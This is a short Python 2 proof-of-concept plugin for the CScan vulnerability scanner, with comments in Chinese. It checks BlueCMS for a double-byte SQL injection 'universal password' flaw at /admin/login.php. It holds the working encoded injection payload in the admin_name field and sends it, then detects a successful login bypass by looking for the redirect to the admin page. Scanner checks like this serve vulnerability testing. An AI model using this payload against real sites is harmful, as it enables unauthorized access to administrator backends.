# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '311d18a0-3f19-4c22-b5ae-73a5b46b5457'
    name = 'BlueCMS 双字节万能密码进后台'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-04-01'  # 漏洞公布时间
    desc = '''
        BlueCMS /admin/login.php 双字节万能密码进后台：
        admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'BlueCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6bde6438-c512-4e18-a7d1-eb381e56675a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-021082
            hh = hackhttp.hackhttp()
            payload = "/admin/login.php"
            target = self.target + payload
            post = "admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login"
            code, head, res, errcode, final_url = hh.http(target, post=post)

            if code == 200 and "setTimeout(\"location.replace('index.php')\",'2000')" in res:
                #security_hole(target+' && post: admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
